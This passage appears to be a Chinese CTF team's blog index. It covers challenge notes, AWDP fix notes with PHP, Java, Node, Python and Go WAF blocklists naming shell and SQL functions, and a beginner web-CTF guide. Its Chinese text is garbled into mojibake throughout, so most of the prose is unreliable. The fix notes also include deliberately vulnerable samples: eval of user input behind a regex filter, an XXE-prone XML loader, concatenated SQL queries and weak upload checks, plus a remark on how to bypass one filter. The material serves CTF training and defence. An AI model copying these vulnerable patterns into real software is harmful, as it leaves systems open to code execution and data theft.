qi1010ï¼šèµµæ±Ÿå— coffeepermanentï¼šåˆ˜æ™‹é“­ çº¿ä¸Šæƒ…å†µ: çº¿ä¸‹æƒ…å†µ:å¦‚å‡åŒ…æ¢ï¼Œsqlæ³¨å…¥ï¼šç®€å•çš„unionè”åˆæ³¨å…¥ union UNION select SELECT = è¶…çº§ç®€å•çš„phpï¼šphpç‰¹æ€§(md5å¼ºå¼±æ¯”è¾ƒ intval æ­£åˆ™%0aç»•è¿‡)+phpå–årce ez_sstiï¼šsstiæ³¨å…¥é»‘åå•æ˜¯[â€˜.â€™, â€˜classâ€™,â€™importâ€™, â€˜globalsâ€™,â€osâ€,â€%â€] A STORYï¼šç®€å•çš„ååºåˆ—åŒ– åŸºæœ¬çš„é­”æœ¯æ–¹æ³•è§¦å‘+ä¸€ä¸ªæ­£åˆ™preg_match(/\\b(?:system|shell|passthru|popen|proc_open|cat|ls|od|fopen)\\b/i, $this-enviroment)"},{"path":"/images/AWDP-waf.html","content":"AWDP-wafé€šç”¨ï¼šä¸ŠWAFã€æ³¨é‡Šæ¼æ´è¯­å¥PHPç‰¹æ€§ï¼šåŸºæœ¬ä¸Šä¸ä¼šå‡ºç°ï¼Œæ²¡æœ‰FIXçš„å®é™…æ„ä¹‰SQLæ³¨å…¥ï¼šä¸ŠWAFã€addslashes() å‡½æ•°è¿‡æ»¤ã€é¢„å¤„ç†SSTIï¼šä¸ŠWAFï¼ˆSSTIåªè¿‡æ»¤{ä¸è¡Œï¼‰åŸå‹é“¾æ±¡æŸ“ï¼šæ³¨é‡Šæ±¡æŸ“ç›¸å…³ä»£ç å³å¯æ–‡ä»¶ä¸Šä¼ ï¼šåç¼€å¼ºæ ¡éªŒã€æ–‡ä»¶å†…å®¹WAFã€MIMAå¤´ï¼ˆæœ€å¥½ä¸€æ¬¡éƒ½ä¿®ä¸Šï¼‰JAVAï¼šæ³¨é‡Šã€ä¸Šè°ƒåº“ç‰ˆæœ¬ã€ä¸ŠWAFä»£ç å®¡è®¡ï¼šä¸ŠWAFã€æ³¨é‡Šæ¼æ´ä»£ç  phpphpæ‰§è¡Œå‘½ä»¤waf?phphighlight_file(__FILE__);$cmd = $_GET[cmd];echo $cmd;if(!preg_match(/\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\|\\[|\\]|\\|\\|\\|\\|\\.|\\|\\/|\\?|\\\\\\\\|\\||[0-9]|limiter|unparsed|gzhandler|quotes|ttyname|diff|decl|fileatime|type|implode|gzgetc|hexdec|strimwidth|encodings|function|shorthash|cfg|gmdate|fputcsv|xml|caches|sleep|finish|mlsd|peak|continue|interfaces|kill|register|aliases|aead|rewrite|pwhash|verify|chgrp|nanosleep|static|setgid|json|strchr|token|boolval|getmyinode|clearstatcache|ob|cdata|output|extract|loader|challenge|number|limit|rename|dh|gztell|rawlist|errors|value|uassoc|getpid|mx|modify|install|acos|strstr|digit|phpcredits|ftruncate|arsort|secretkey|linkinfo|tan|to|wordwrap|unshift|end|locations|from|byte|floor|secretbox|interface|printf|local|unregister|dir|bucket|reverse|bytes|flock|compare|getpwnam|getegid|checkdate|strrchr|uksort|pack|generichash|search|unpack|regenerate|html|constants|sqrt|chars|shuffle|scandir|values|exists|real|opendir|preg|sum|identifiers|setpgid|diskfreespace|stristr|getsid|grep|strpos|url|rehash|flip|full|backtrace|bin2base64|getservbyport|timezone|ed25519|language|finfo|digest|subject|scryptsalsa208sha256|alter|derive|timestamp|internal|ftell|max|funcs|context|regs|gzopen|uintersect|temp|detached|geteuid|subclass|save|keypair|levenshtein|timeout|ns|index|stripslashes|expire|drivers|addcslashes|rad2deg|parser|decbin|strnatcasecmp|gethostbyname|sin|meta|udiff|sent|apply|crypto|acosh|substr|log|ssl|fileperms|remove|dtd|options|included|call|fputs|writable|mem|splice|request|property|size|sprintf|in|mail|of|round|feof|realpath|seed|on|strtr|unset|localtime|strpbrk|tanh|gzcompress|recvfrom|strnatcmp|current|pkcs7|filemtime|struct|params|chown|graph|fstat|long2ip|sodium|traits|alpha|lstat|session|path|sunset|urlencode|executable|tick|indent|natsort|string|asinh|stripcslashes|rmdir|strripos|fastcgi|convert|pop|hebrevc|open|strtoupper|trim|sapi|magic|seal|getimagesize|sendto|autoload|implicit|send|ukey|history|floatval|ref|arg|quoted|format|strcspn|iptcembed|getloadavg|intval|uri|lower|nb|initgroups|multisort|name|mimeheader|total|phpversion|pi|list|fgetcsv|rekey|rawurlencode|rewind|user|getgroups|iterator|exception|octdec|ftp|bindec|quote|details|getpgid|strftime|pasv|strncasecmp|crc32|getmygid|into|coding|iv|init|new|closedir|fmod|deg2rad|instruction|quotemeta|escapeshellarg|doubleval|sub|rot13|sinh|restore|gzuncompress|log10|gzread|commit|gethostbynamel|mime|gmstrftime|usort|namespace|filegroup|csr|mkfifo|record|element|mberegi|len|disable|bin2hex|printable|lchgrp|combine|attribute|gzpassthru|gethostbyaddr|cache|settype|mbereg|runtime|load|xmlwriter|setegid|syslog|sun|nl2br|asort|fseek|gethostname|pos|set|getservbyname|site|abbr|mhash|kx|vsprintf|expm1|popen|push|eregi|umask|getpgrp|gzdecode|uses|module|repeat|close|connect|openssl|s2k|declared|default|isatty|float|debug|system|getallheaders|contents|chr|abbreviations|getprotobyname|ezmlm|ntop|fnmatch|x509|fprintf|gzeof|rsort|uname|addslashes|pk|getmxrr|gmmktime|func|vars|character|checkpurpose|image|getrandmax|source|handlers|auth|cert|extension|dirname|apache|getcsv|class|hypot|soundex|start|vprintf|first|pair|redisplay|space|array|build|use|cos|fscanf|block|socket|callable|getimagesizefromstring|notation|setlocale|fill|iptcparse|hash|word|parse|forward|get|transitions|mbregex|compact|gzgetss|flush|map|compute|sys|alloc|fgetss|sign|getdate|spl|usleep|length|uudecode|gzgets|put|methods|errno|uuencode|bool|lcfirst|location|systype|files|strrpos|key|localeconv|getrusage|prev|rtrim|pbkdf2|random|gc|tags|ftok|available|define|sort|scalarmult|deflate|dom|range|crypt|has|buffer|pow|regex|lock|hex2bin|match|closelog|is|reduce|stat|enable|setpos|resolve|sha1|assert|all|functions|gettimeofday|pull|gzclose|dechex|uasort|append|getgid|connection|var|classes|clean|null|gzrewind|accept|prepend|lcg|column|xchacha20poly1305|sunrise|detect|strcmp|select|uploaded|alnum|openlog|trigger|spki|update|strrichr|getenv|numeric|natcasesort|change|getgrnam|zlib|ctype|stripos|getrlimit|blocking|id|putenv|tmpfile|reporting|cycles|abs|getpwuid|browser|lchown|processing|constant|setcookie|print|args|alias|unserialize|sizeof|fget|rawurldecode|getprotobynumber|libxml|import|explode|cosh|unlink|pclose|level|privatekey|file|ucwords|getlogin|quit|strip|keygen|loaded|simplexml|filectime|assoc|infinite|encoding|symlink|strncmp|memcmp|cipher|escapeshellcmd|supports|move|http|secretstream|wrapper|htmlentities|response|make|fsockopen|gzwrite|export|getuid|mbsplit|money|highlight|pathinfo|ord|line|ceil|zend|filter|writeable|rewinddir|product|resources|split|gzencode|decode|wrappers|base64|shift|gpc|private|server|passthru|curve|and|krsort|handler|isodate|pdo|ietf|atan|gzputs|ireplace|ltrim|flags|atanh|touch|hebrev|punct|include|vfprintf|status|fread|memzero|utf8|header|gzseek|similar|keys|unpad|external|immutable|log1p|filetype|order|char|called|metaphone|seteuid|rand|final|intdiv|times|strerror|strlen|xdigit|show|slice|getpos|atan2|serialize|pkcs12|mktime|getcwd|readfile|cntrl|setsid|nl|copy|hmac|pad|posix|cyr|disk|strtok|merge|info|pseudo|time|readgzfile|htmlspecialchars|nice|fgets|entity|comment|ini|implements|getmyuid|algos|ignore|readlink|md|memory|getopt|method|login|fwrite|until|aborted|fopen|preferred|intersect|gzinflate|mkdir|error|defined|fclose|strtotime|tempnam|next|strspn|callback|variables|scrub|date|mb|public|input|ctermid|reset|strcasecmp|fingerprint|hrtime|usage|whitespace|msg|content|getgrgid|needs|ip2long|decrypt|cookie|xor|strcoll|langinfo|publickey|decoct|setrawcookie|srand|strwidth|enabled|free|check|checkdnsrr|stream|getregs|strval|fpm|kdf|pkey|chmod|nan|min|required|shutdown|names|fpassthru|case|chacha20poly1305|setrlimit|scalar|filesize|nlist|collect|equals|aes256gcm|exec|upper|shell|urldecode|getmypid|delete|chunk|fgetc|mt|gzdeflate|strptime|terminate|fileinode|read|encode|count|scanned|option|ucfirst|exp|clear|version|num|microtime|replace|streams|data|sk|dump|create|walk|increment|readable|readdir|numericentity|document|text|gettype|sscanf|getppid|fileowner|object|link|str|double|trait|long|encrypt|query|destroy|kana|int|filters|recursive|each|mdtm|fflush|chdir|finite|dns|extensions|mknod|headers|strtolower|join|proc|cdup|base|pfsockopen|base642bin|raw|setuid|md5|php|attlist|curve25519|parents|abort|getlastmod|uniqid|table|asin|interval|iconv|fput|substitute|last|pton|password|pwd|inet|countable|translation|client|transports|readline|strrev|glob|resource|zval|integer|parent|strcut|ereg|box|idate|inflate|chop|unique|gzfile|iterable|net|add|code|hkdf|write|ksort|completion|offset|access|require|echo|if/i, $cmd)) eval($cmd);else echo ?; thinkphpæ¡†æ¶é˜²æŠ¤æŠŠè¿™ä¸ªwafç›´æ¥ä¸Šåˆ°publicindex.phpæœ€å‰é¢ å¯ä»¥é˜²ä½æ‰€æœ‰çš„tpæ¡†æ¶æ¼æ´ foreach($_REQUEST as $key=$value) $_POST[$key] = preg_replace(/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i,,$value); $_GET[$key] = preg_replace(/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i,,$value); phpä¸­getå’Œposté™åˆ¶$str1 =;foreach ($_POST as $key = $value) $str1.=$key; $str1.=$value;$str2 =;foreach ($_GET as $key = $value) $str2.=$key; $str2.=$value;if (preg_match(/system|tail|flag|\\|\\|\\|\\|\\|exec|base64|phpinfo|\\?|\\/i, $str1)||preg_match(/system|tail|flag|\\|\\|\\|\\|\\|exec|base64|phpinfo|\\?|\\/i, $str2)) die(no!); php-rce-sql-xss-xxe//RCEfunction wafrce($str)\treturn !preg_match(/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i, $str);//ä»¥ä¸‹è¿™ä¸ªå¯ä»¥ç”¨çŸ­æ ‡ç­¾+åå¼•å·+é€šé…ç¬¦ç»•è¿‡è¿‡æ»¤preg_match(/\\^|\\||\\~|assert|print|include|require|\\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\\_|disk|tcp|cat|tac/i, $str);//SQLfunction wafsqli($str)\treturn !preg_match(/select|and|\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|||;|\\|\\|\\^|\\|/i, $str);if (preg_match(/select|flag|union|\\\\\\\\$|\\|\\|--|#|\\\\0|into|alert|img|prompt|set|/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\|\\|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\|\\|union|\\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\\|\\*|\\.|/is,$s)||strlen($s)50) header(Location: /); die(); //XSSfunction wafxss($str)\treturn !preg_match(/\\|http|\\|\\`|cookie|||script/i, $str);function wafrce($str)\treturn !preg_match(/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i, $str);function wafsqli($str)\treturn !preg_match(/select|and|\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|||;|\\|\\|\\^|\\|/i, $str);function wafxss($str)\treturn !preg_match(/\\|http|\\|\\`|cookie|||script/i, $str); // fixå(XXE)?php function is_user_exists($username, $user_info_dir): bool $dirs = array_filter(glob($user_info_dir . /*), is_dir); foreach ($dirs as $dir) $dirName = basename($dir); if($dirName === $username) return true; return false; function register_user($username, $user_info_dir, $user_xml) $r = /php|read|flag/i; $username = preg_replace($r,,$username); $user_dir_name = $user_info_dir.$username; mkdir($user_dir_name, 0777); file_put_contents($user_dir_name./.$username..xml, $user_xml); function get_user_record($username, $user_info_dir) $r = /php|read|flag/i; $username = preg_replace($r,,$username); $user_info_xml = file_get_contents($user_info_dir.$username./.$username..xml); $dom = new DOMDocument(); $dom-loadXML($user_info_xml, LIBXML_NOENT | LIBXML_DTDLOAD); return simplexml_import_dom($dom); sqlæ³¨å…¥ä¿®å¤ç”¨addslashes() å‡½æ•°è¿‡æ»¤addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼šå•å¼•å·ï¼ˆï¼‰åŒå¼•å·ï¼ˆï¼‰åæ–œæ ï¼ˆ\\ï¼‰NULLè¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚ $username = $_GET[username];$password = $_GET[password];$username = addslashes($username);$password = addslashes($password);if (isset($_GET[username]) isset($_GET[password])) $sql = SELECT * FROM users WHERE username = $username AND password = $password; é¢„å¤„ç†ï¼ˆmysql+podï¼‰æ¼æ´æºç  ?phperror_reporting(0);include dbConnect.php;$username = $_GET[username];$password = $_GET[password];if (isset($_GET[username]) isset($_GET[password])) $sql = SELECT * FROM users WHERE username = $username AND password = $password; $result = $mysqli-query($sql); if (!$result) die(mysqli_error($mysqli)); $data = $result-fetch_all(); // ä»ç»“æœé›†ä¸­è·å–æ‰€æœ‰æ•°æ® if (!empty($data)) echo ç™»å½•æˆåŠŸï¼; else echo ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯; ? mysqlé¢„å¤„ç† ä½¿ç”¨ é¢„å¤„ç†è¯­å¥ï¼ˆPrepared Statementï¼‰ã€‚ä½¿ç”¨ å‚æ•°ç»‘å®šï¼ˆbind_paramï¼‰ã€‚å‚æ•°å€¼ $usernameã€$password ä¸ä¼šç›´æ¥æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œè€Œæ˜¯ä»¥å‚æ•°å½¢å¼å‘é€ç»™æ•°æ®åº“ ?phperror_reporting(0);include dbConnect.php;$username = $_GET[username];$password = $_GET[password];if (isset($_GET[username]) isset($_GET[password])) $template = $mysqli-prepare(SELECT * FROM users WHERE username = ? AND password = ?); $template-bind_param(ss, $username, $password); $exe = $template-execute(); if(!$exe) die(error); $template-store_result(); $data = $template-num_rows; // è·å–ç»“æœé›†ä¸­çš„è¡Œæ•° if (!empty($data)) echo ç™»å½•æˆåŠŸï¼; else echo ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯; ? PDO é¢„å¤„ç† ?php//çœç•¥......$name = $_GET[username];$passwd = $_GET[password];try $conn = new PDO(mysql:host=$serve;dbname=$dbname, $username, $password); $conn-setAttribute(POD::ATTR_EMULATE_PREARES, false); if(isset($_GET[username]) isset($_GET[password])) $stmt = $conn-prepare(SELECT * FROM users WHERE username = :username AND password = :password); $stmt-bindParam(:name, $name); $stmt-bindParam(:passwd, $passwd); $exe = $stmt-execute(); if(!$exe) die(error); ; $result = $stmt-fetchAll(); if(!empty($result)) echo Login Success!; else echo Login Failed!; catch(PDOException $e) echo Connection failed: . $e-getMessage();$conn = null;? .htaccesså¯èƒ½ä¼šåˆ¤å®šå®•æœº IfModule mod_rewrite.cdeny from all/IfModule IfModule mod_rewrite.c RewriteEngine On RewriteRule \\.ph.*$ - [F]/IfModule IfModule mod_rewrite.c RewriteEngine On RewriteRule ^\\.index\\.php$ - [F]/IfModule æ–‡ä»¶ä¸Šä¼ åç¼€åwafæœ€å¥½æ˜¯ç™½åå•åªå…è®¸ä¸Šä¼ ä»€ä¹ˆ apacheè§£ææ¼æ´è®°å¾—åªå…è®¸ä¸€ä¸ª.å‡ºç° ?php// $path = ./uploads;error_reporting(0);$path = ./uploads;$content = file_get_contents($_FILES[myfile][tmp_name]);$allow_content_type = array(image/png);$type = $_FILES[myfile][type];if (!in_array($type, $allow_content_type)) die(åªå…è®¸pngå“¦!br);//ä¿®æ”¹ç‚¹1$allow_ext = array(.png);$file_name=$_FILES[myfile][name];$_FILES[myfile][name] = str_replace(.ph,,$_FILES[myfile][name]);$file_ext = strrchr($file_name, .);$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™$file_ext = str_ireplace(::$DATA, , $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA$file_ext = trim($file_ext); //æ”¶å°¾å»ç©ºif (!in_array($file_ext, $allow_ext)) die(åªå…è®¸pngå“¦!br);//ä¿®æ”¹ç‚¹2if (preg_match(/(php|script|xml|user|htaccess|\\\\?|\\\\?\\=|eval|system|assert|fllllagg|f\\*|\\/f|cat|POST|GET|\\$\\_|exec)/i, $content)) // echo åŒ¹é…æˆåŠŸ!; die(é¼ é¼ è¯´ä½ çš„å†…å®¹ä¸ç¬¦åˆå“¦0-0); else $file = $path . / . $_FILES[myfile][name]; echo $file; if (move_uploaded_file($_FILES[myfile][tmp_name], $file)) file_put_contents($file, $content); echo Success!br; else echo Error!br; ? ?phpheader(Content-type: text/html;charset=utf-8);error_reporting(1);define(WWW_ROOT,$_SERVER[DOCUMENT_ROOT]);define(APP_ROOT,str_replace(\\\\,/,dirname(__FILE__)));define(APP_URL_ROOT,str_replace(WWW_ROOT,,APP_ROOT));define(UPLOAD_PATH, upload);??php$is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.jpg,.png,.jpeg); //ã€ä¿®æ”¹ç‚¹ä¸€ã€‘ $file_name = trim($_FILES[upload_file][name]); $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(::$DATA, , $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (in_array($file_ext, $deny_ext)substr_count($_FILES[upload_file][name], .)===1) //ã€ä¿®æ”¹ç‚¹äºŒã€‘ $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = ä¸Šä¼ å‡ºé”™ï¼; else $msg = æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !; else $msg = UPLOAD_PATH . æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼; ? javaå…·ä½“æ¼æ´è€„è€‹ä¸çŸ¥é“å•Šã€‚ã€‚ã€‚æˆ‘ä¸ä¼šjvav ä¸è¦æƒ³æ”»å‡»äº†å¥½å§ èƒ½åƒåˆ°fixçš„åˆ†éƒ½ä¸é”™äº† fixä½¿ç”¨jareditoræ’ä»¶ ç›´æ¥æŠŠjaråŒ…ä½œä¸ºå¤–éƒ¨åº“å¯¼å…¥ ç›´æ¥ä¿®æ”¹å°±å¯ä»¥ æ”¹å¥½äº†å…ˆç‚¹å‡»saveå†ç‚¹å‡»build jarå°±ç”Ÿæˆå¥½äº† ç„¶åè¿›å…¥ç»ˆç«¯ java -jar *.jarå¦‚æœæ­£å¸¸è¿è¡Œ é‚£å°±æ˜¯æˆåŠŸç¼–è¯‘jaråŒ… sqlæ³¨å…¥//fiximport java.util.regex.Pattern;public class MaliciousInputChecker public static void main(String[] args) String input = SELECT * FROM users WHERE id = 1 OR 1=1; public static boolean isMalicious(String input, String[] maliciousStrings) input = input.toLowerCase(); for (int i = 0; i maliciousStrings.length; i++) Pattern pattern = Pattern.compile(maliciousStrings[i], Pattern.CASE_INSENSITIVE); if (pattern.matcher(input).find()) return true; return false; node.jsåŸå‹é“¾æ±¡æŸ“æŠŠä¸‹é¢çš„inputæ”¹æˆé¢˜ç›®çš„å¯æ§è¾“å…¥ç‚¹å³å¯ const input = awdwawdd;const maliciousStrings = [__proto__, constructor, prototype, insert, update, truncate, drop, create, \\, , , , ,union, select, delete, \\, , , , , .,,,flag];function isMalicious(input, maliciousStrings) input = input.toLowerCase(); for (let i = 0; i maliciousStrings.length; i++) const pattern = new RegExp(maliciousStrings[i], i); if (pattern.test(input)) return true; return false;if (isMalicious(input, maliciousStrings)) console.log(è¾“å…¥å‚æ•°åŒ…å«æ¶æ„å­—ç¬¦ä¸²); else console.log(è¾“å…¥å‚æ•°å®‰å…¨); // fixåapp.get(/profile, function (req, res) ... ... ... ... ... const blacklist = [ outputFunctionName, __proto__, return, global, process, mainModule, constructor, child, execSync,escapeFunction, client, compileDebug, prototype ] for (let i = 0; i blacklist.length; i++) if (data.includes(blacklist[i])) return res.status(400).render(error, code: 400, msg: hack ); pythonsstiblack_list = [,, , , _, [,.,%,+,|,(,),,,\\\\,/] for tmp in black_list: if tmp in v: raise ValueError(note cannot contain a special character) # fix@app.route(/, methods=[GET, POST])def index():\tip, port = re.findall(pattern,request.host).pop()\tif request.method == POST and request.form.get(word): word = request.form.get(word) black_list = [,, , , _, [,.,%,+,|,(,),,,\\\\,/,flag] for tmp in black_list: if tmp in word: word = Hacker! if not waf(word): word = Hacker!\telse: word = return render_template_string(content % (str(ip), str(port), str(word))) sqlå†™é»‘åå• conn = sqlite3.connect(db.sqlite3)cursor = conn.cursor()cursor.execute(INSERT INTO sys_users (username, password, role) VALUES ( ? , ? , ? ), (username, password, role)) content = blacklist = [\\,union,\\,select,(,),,, ,%]for i in blacklist: if i in content.lower(): exit() é»‘åå•content = blacklist = [\\,exec,\\,os,open,system,import,_,\\\\u,doc]for i in blacklist: if i in content.lower(): exit() ssrfç¦æ­¢ file load_file . / ./ ../ proc goè¿™ä¸ªå†™åœ¨æ¼æ´ç‚¹å‰é¢ï¼Œç„¶åinputæ›¿æ¢æˆæˆ‘ä»¬éœ€è¦æ£€æµ‹æ­£åˆ™çš„å­—ç¬¦ä¸²å³å¯ã€‚æ£€æµ‹åˆ°å°±ä¼šreturnç»“æŸã€‚ä½†æ˜¯ä¸‹é¢çš„æ­£åˆ™å†™æ³•ä¾èµ–stringsåº“ import (\tfmt\tstrings)func main() var input string\tfmt.Print(è¯·è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š)\tfmt.Scanln(input)\tmaliciousStrings := []stringunion, select, delete, insert, update, truncate, drop, create, \\, , , , , .,,,flag\tinput = strings.ToLower(input) // å°†è¾“å…¥è½¬æ¢ä¸ºå°å†™ï¼Œä¾¿äºåŒ¹é…\tfor _, s := range maliciousStrings if strings.Contains(input, s) return // åŒ…å«æ¶æ„å­—ç¬¦ä¸² ä¸‹é¢çš„å†™æ³•ä¸ä¾èµ–è¿™ä¸ªstringsåº“ import (\tfmt)func main() var input string\tfmt.Print(è¯·è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š)\tfmt.Scanln(input)\tmaliciousStrings := []stringunion, select, delete, insert, update, truncate, drop, create, \\, , , , , .,,,flag\tif isMalicious(input, maliciousStrings) return\tfunc isMalicious(input string, maliciousStrings []string) bool input = stringToLower(input)\tfor _, s := range maliciousStrings if stringContains(input, s) return true return falsefunc stringToLower(str string) string runes := []rune(str)\tfor i, r := range runes if r = A r = Z runes[i] = r + (a - A) return string(runes)func stringContains(str string, substr string) bool strRunes := []rune(str)\tsubstrRunes := []rune(substr)\tfor i := 0; i = len(strRunes)-len(substrRunes); i++ found := true for j := 0; j len(substrRunes); j++ if strRunes[i+j] != substrRunes[j] found = false break if found return true return false"},{"path":"/images/åŸŸæ¸—é€.html","content":"åŸŸæ¸—é€"},{"path":"/images/WEBå…¥é—¨æ–‡æ¡£.html","content":"ä½ å¥½å•Šæƒ³è¦å…¥é—¨webçš„å°é»‘å®¢~ ä¸€ã€Web æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼ŸWeb å°±æ˜¯æˆ‘ä»¬åœ¨æµè§ˆå™¨é‡Œçœ‹åˆ°çš„ç½‘ç«™ï¼Œæ˜¯è¿æ¥æ•´ä¸ªä¿¡æ¯ä¸–ç•Œçš„çº¿ç´¢ç½‘ã€‚ ä»ä½ åˆ·å¾®åšã€çœ‹æ·˜å®ã€è¿½åŠ¨æ¼«ã€ç‚¹å¤–å–â€¦â€¦éƒ½åœ¨ä½¿ç”¨ Web åº”ç”¨ã€‚å®ƒçš„èƒŒåæ˜¯ç”±å‰ç«¯ï¼ˆä½ çœ‹å¾—è§çš„éƒ¨åˆ†ï¼‰+ åç«¯ï¼ˆä½ çœ‹ä¸è§çš„é€»è¾‘å¤„ç†ï¼‰æ„æˆçš„åºå¤§ç³»ç»Ÿã€‚ è€Œ CTF ä¸­çš„ Web é¢˜ç›®ï¼Œå°±æ˜¯å›´ç»•è¿™äº›ç½‘ç«™çš„æ¼æ´å±•å¼€çš„å¤ºæ——æ¸¸æˆã€‚å¦‚æœè¿ç½‘ç«™æ˜¯æ€ä¹ˆè¿è¡Œçš„éƒ½ä¸çŸ¥é“ï¼Œé‚£ä½ æ€ä¹ˆçŸ¥é“è¯¥å¾€å“ªå„¿ä¸‹åˆ€å‘¢ï¼Ÿæ‰€ä»¥ï¼Œä½ å¯ä»¥åŠ¨æ‰‹æ­å»ºä¸€ä¸ªä½ è‡ªå·±çš„å°ç½‘ç«™ï¼Œè¿™æ˜¯æ‰€æœ‰ Web æ‰‹çš„å¿…å¤‡æŠ€èƒ½ï¼ äºŒã€å­¦ä¹ æ–¹æ³•ã€æŠ€èƒ½ä¸€ã€‘ï¼šä¸æ‡‚å°±æœ æ‰“å¼€ä½ æœ€å–œæ¬¢çš„æœç´¢å¼•æ“ï¼ˆæ¨èï¼šGoogleã€Bingï¼‰ï¼Œå¤§èƒ†æœã€‚ä¸ç®¡æ˜¯â€œå¦‚ä½•ä½¿ç”¨ burpâ€è¿˜æ˜¯â€œPHPæ€ä¹ˆä¸Šä¼ æ–‡ä»¶â€ï¼Œç»Ÿç»Ÿéƒ½èƒ½æœåˆ°ã€‚ä¿¡æ¯æ£€ç´¢èƒ½åŠ›ä¹Ÿæ˜¯ä¸€é¡¹å¿…å¤‡çš„æŠ€èƒ½ ã€æŠ€èƒ½äºŒã€‘ï¼šä¸æ‡‚å°±é—® æ¨èï¼šå…ˆçŸ¥ç¤¾åŒºã€Freebufã€çŸ¥ä¹ã€CSDNã€çœ‹é›ªã€å¤§ä½¬ä¸ªäººåšå®¢ å½“ç„¶ä½ æœ‰ä»»ä½•ç–‘é—®ä¹Ÿå¯ä»¥æ‰¾å¾æˆ–è€…å®éªŒå®¤å…¶ä»–webæ–¹å‘çš„å¸ˆå‚…ï¼Œæˆ‘ä»¬éå¸¸ä¹æ„å›ç­”ä½ çš„é—®é¢˜ï¼Œä½†æ˜¯æé—®ä¹Ÿéœ€è¦ä¸€å®šçš„æŠ€å·§ï¼Œå¾ä¸ºä½ æä¾›ä¸€æœ¬æŠ€å·§ä¹¦ï¼Œçœ‹å®Œä½ çš„æé—®æ•ˆç‡å°†å¤§å¤§æå‡ï¼ Smart Questions ã€æŠ€èƒ½ä¸‰ã€‘ï¼šå­¦ä¼šè®°å½•ç¬”è®° æ‹¥æœ‰æœ¬åœ°ç¬”è®°æ˜¯éå¸¸å¿…è¦çš„ï¼Œå®ƒå¯ä»¥åœ¨ä½ é—å¿˜æ—¶å¿«é€Ÿæœåˆ°çŸ¥è¯†ç‚¹ä¹Ÿå¯ä»¥å¸®ä½ åŠ æ·±å¯¹çŸ¥è¯†ç‚¹çš„å°è±¡ã€‚ æœ¬åœ°å†™ç¬”è®°çš„è½¯ä»¶éå¸¸å¤šï¼Œå¾ç”¨çš„æ˜¯Typoraï¼è¿™é‡Œä½ ä¹Ÿä¼šå­¦åˆ°ä¸€ç‚¹mdè¯­æ³•ã€‚ ä¸‰ã€æˆé•¿è·¯çº¿å…¥é—¨ Web CTFï¼Œä½ å¤§æ¦‚ä¼šç»è¿‡ä»¥ä¸‹å‡ ä¸ªâ€œé˜¶æ®µâ€ï¼Œæ¯ä¸€å…³éƒ½å……æ»¡æ€ªç‰©å’Œå®è—ï¼š é…ç½®ç¯å¢ƒï¼ˆæœ€ç—›ä½†å¿…è¦ï¼‰ç¯å¢ƒé…ç½®ä¹‹è·¯ï¼Œå¯è°“æ— æ•°å‹‡è€…æ³ªæ´’çš„å‰¯æœ¬â€¦â€¦ ç”¨è™šæ‹Ÿæœºï¼ˆæ¨è VMware + kali)ï¼Œè¾¹å­¦ shell å‘½ä»¤è¾¹ä½“éªŒé»‘å®¢èŒƒã€‚ æµè§ˆå™¨è£…ä¸Šæ’ä»¶ï¼ˆhackbarã€Proxy 